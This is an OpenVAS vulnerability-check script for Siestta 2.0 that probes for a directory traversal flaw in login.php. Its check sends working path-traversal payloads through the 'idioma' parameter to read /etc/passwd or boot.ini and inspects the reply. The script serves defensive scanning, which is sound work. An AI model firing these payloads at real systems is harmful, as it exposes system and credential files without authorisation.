##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_siestta_dir_trav_n_xss_vuln.nasl 8438 2018-01-16 17:38:23Z teissa $
#
# Siestta Directory Traversal and Cross Site Scripting Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow remote attackers to obtain
sensitive information or execute arbitrary code on the vulnerable web server.

Impact Level: Application.";

tag_affected = "Siestta version 2.0";

tag_insight = "The flaws are due to the improper validation of user supplied
data in 'login.php' via 'idioma' parameter and in 'carga_foto_al.php' via
'usuario'  parameter before being used to include files.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running Siestta and is prone to directory traversal
  and cross site scripting vulnerabilities.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800769");
  script_version("$Revision: 8438 $");
  script_tag(name:"last_modification", value:"$Date: 2018-01-16 18:38:23 +0100 (Tue, 16 Jan 2018) $");
  script_tag(name:"creation_date", value:"2010-05-13 09:36:55 +0200 (Thu, 13 May 2010)");
  script_cve_id("CVE-2010-1710", "CVE-2010-1711");
  script_bugtraq_id(39526);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("Siestta Directory Traversal and Cross Site Scripting Vulnerabilities");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/39453");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/57900");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/12260");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_siestta_detect.nasl");
  script_require_ports("Services/www", 80);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

siPort = get_http_port(default:80);
if(!get_port_state(siPort)){
  exit(0);
}

## Get Siestta version from KB
siVer = get_kb_item("www/" + siPort + "/Siestta");
if(!siVer){
 exit(0);
}

siVer = eregmatch(pattern:"^(.+) under (/.*)$", string:siVer);
if(siVer[2] != NULL)
{
  ## Check exploit on Linux
  sndReq = http_get(item:string(siVer[2], "/login.php?idioma=../../../../../" +
                    "../../../../../../etc/passwd%00"), port:siPort);
  rcvRes = http_send_recv(port:siPort, data:sndReq);
  if("root" >< rcvRes || "daemon:/sbin" >< rcvRes)
  {
    security_message(siPort);
    exit(0);
  }

  ## Check exploit on Windows
  sndReq = http_get(item:string(siVer[2], "/login.php?idioma=../../../../../" +
                    "../../../../../../boot.ini%00"), port:siPort);
  rcvRes = http_send_recv(port:siPort, data:sndReq);
  if("\WINDOWS" >< rcvRes || "partition" >< rcvRes){
    security_message(siPort);
  }
}
